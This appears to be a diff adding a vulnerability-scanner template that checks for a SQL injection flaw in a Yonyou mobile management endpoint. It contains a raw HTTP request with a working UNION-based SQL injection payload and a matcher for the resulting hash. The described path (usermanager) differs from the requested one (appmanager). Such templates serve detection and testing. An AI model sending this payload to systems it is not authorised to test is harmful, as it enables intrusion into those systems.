@@ -1,0 +1,32 @@
+id: yonyou-usermanager-init-sqli
+info:
+  name: yonyou-usermanager-init-sqli
+  author: apple
+  severity: high
+  description: 用友移动系统管理 /maportal/usermanager/init 存在SQL注入漏洞
+  reference:
+    - https://mp.weixin.qq.com/s/9yZ6kYfku-fXFwtwAc5Alg
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /maportal/appmanager/init HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 40
+        Accept: */*
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Origin: http://127.0.0.1:5080
+        Referer: http://127.0.0.1/maportal/html/paramsetup/paramsetup.html
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: JSESSIONID=D298606CA51929CE86EA83C32FA39139.server
+        Connection: close
+
+        qaxnb' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,sys.fn_varbintohexstr(hashbytes('md5','test')),NULL,NULL,NULL,NULL,NULL,NULL--&sys_type=&loginmode=
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c8059e2ec7419f590e79d7f1b774bfe6'
